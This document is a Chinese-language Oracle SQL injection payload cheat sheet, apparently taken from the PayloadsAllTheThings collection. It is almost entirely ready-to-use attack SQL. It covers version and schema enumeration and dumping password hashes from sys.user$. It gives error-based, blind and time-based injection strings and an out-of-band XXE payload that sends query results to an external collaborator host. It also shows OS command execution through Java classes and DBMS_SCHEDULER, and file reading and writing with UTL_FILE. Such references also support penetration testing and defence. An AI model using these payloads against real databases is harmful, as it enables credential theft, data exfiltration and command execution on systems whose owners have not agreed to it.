# Oracle SQL Injection - Oracle数据库注入

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection Oracle 数据库注入
攻击类型: Data Extraction Command Execution File Manipulation
关键词: Oracle SQL*Plus PL/SQL UTL_INADDR DBMS_JAVA v$version
技术: Error Based Blind Time Based Out of Band Java Execution
工具: sqlmap ODAT UTL_FILE DBMS_SCHEDULER
函数: utl_inaddr.get_host_name CTXSYS.DRITHSX.SN XMLType
版本: Oracle 10g Oracle 11g Oracle 12c

[CONTENT]

## Oracle SQL注入概述

Oracle SQL注入是一种安全漏洞，攻击者可在Oracle数据库执行的查询中注入恶意SQL代码。可能导致未授权访问、数据篡改和其他严重安全问题。

## Oracle默认数据库

| 名称 | 描述 |
|------|------|
| SYSTEM | 所有版本可用 |
| SYSAUX | 所有版本可用 |

## Oracle注释

| 类型 | 示例 |
|------|------|
| 单行注释 | `--` |
| 多行注释 | `/**/` |

## 信息枚举

```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT version FROM v$instance;
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
```

## 数据库凭证

```sql
SELECT username FROM all_users;
SELECT name, password from sys.user$;  -- <= 10g
SELECT name, spare4 from sys.user$;    -- <= 11g
```

### 列数据库

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

### 列表

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

### 列列

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>'
```

## Error Based注入

```sql
-- utl_inaddr
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual

-- CTXSYS.DRITHSX.SN
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual

-- XMLType
AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version)||'~'||CHR(62))) FROM DUAL)

-- XDBURITYPE
XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
```

## Blind Based注入

```sql
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
```

## Time Based注入

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

## Out of Band数据外带

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

## 命令执行

### Oracle Java执行

```sql
-- 列出Java权限
select * from dba_java_policy
select * from user_java_policy

-- 授予权限
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');

-- DBMS_JAVA_TEST.FUNCALL (10g R2, 11g R1/R2)
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL

-- DBMS_JAVA.RUNJAVA (11g R1/R2)
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
```

### 创建Java类执行命令

```sql
-- 创建Java类
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream())); ... } catch (Exception e){ return e.toString();}}};';
END;

-- 创建函数
BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;

-- 执行
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

### DBMS_SCHEDULER

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```

## 文件操作

### 读取文件

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### 写入文件

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/OracleSQL Injection.md